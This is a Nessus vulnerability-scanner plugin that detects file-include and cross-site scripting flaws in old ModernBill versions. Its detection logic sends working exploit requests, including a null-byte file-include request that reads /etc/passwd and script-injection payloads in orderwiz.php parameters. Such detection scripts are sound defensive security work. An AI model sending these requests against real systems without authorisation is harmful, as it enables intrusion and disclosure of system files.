#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(18008);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2005-1053", "CVE-2005-1054");
  script_bugtraq_id(13086, 13087, 13089);
  script_osvdb_id(15426, 15427);

  script_name(english:"ModernBill <= 4.3.0 Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that suffers from
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The version of ModernBill installed on the remote host is subject to
multiple vulnerabilities :

  - A Remote File Include Vulnerability
    The application fails to sanitize the parameter 'DIR' before
    using it in the script 'news.php'. An attacker can exploit
    this flaw to browse or execute arbitrary files on the remote 
    host. Further, if PHP's 'allow_url_fopen' setting is enabled,
    files to be executed can even come from a web server
    under the attacker's control.

  - Multiple Cross-Site Scripting Vulnerabilities
    An attacker can inject arbitrary HTML and script code via the
    parameters 'c_code' and 'aid' in the script 'orderwiz.php' in
    order to steal cookie-based authentication credentials for
    the remote host or launch other such attacks." );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00067-04102005" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Apr/135" );
 script_set_attribute(attribute:"see_also", value:"http://www.moderngigabyte.com/modernbill/forums/showthread.php?t=20520" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to ModernBill 4.3.1 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/04/11");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/04/10");
 script_cvs_date("$Date: 2016/10/27 15:03:55 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in ModernBill 4.3.0 and older";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencies("cross_site_scripting.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# A simple alert to display "Nessus was here".
xss = "<script>alert('Nessus was here');</script>";
# nb: the url-encoded version is what we need to pass in.
exss = "%3Cscript%3Ealert('Nessus%20was%20here')%3B%3C%2Fscript%3E";
exploits = make_list(
  "/order/orderwiz.php?v=1&aid=&c_code=" + exss,
  "/order/orderwiz.php?v=1&aid=" + exss
);

# Search for ModernBill
foreach dir (cgi_dirs()) {
  # Grab index.php.
  r = http_send_recv3(method: "GET", item:string(dir, "/index.php"), port:port);
  if (isnull(r)) exit(0);

  # If it's ModernBill...
  if (
    egrep(string: r[2], pattern:"<TITLE>ModernBill .:. Client Billing System", icase:TRUE) ||
    egrep(string: r[2], pattern:"<!-- ModernBill TM .:. Client Billing System", icase:TRUE)
  ) {

    # Try to exploit the file include vulnerability by grabbing /etc/passwd.
    r = http_send_recv3(method: "GET", item:string(dir, "/news.php?DIR=/etc/passwd%00"), port:port);
    if (isnull(r)) exit(0);

    # If there's an entry for root, there's a problem.
    if (egrep(string: r[2], pattern:"root:.+:0:")) {
      security_warning(port);
      exit(0);
    }

    # Otherwise, try to exploit the XSS vulnerabilities.
    if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

    foreach exploit (exploits) {
      r = http_send_recv3(method: "GET", item:string(dir, exploit), port:port);
      if (isnull(r)) exit(0);

      # There's a problem if we see our XSS.
      if (r[0] =~ "^HTTP/1\.[01] 200 " && xss >< r[2]) {
        security_warning(port);
	set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
        exit(0);
      }
    }
  }
}
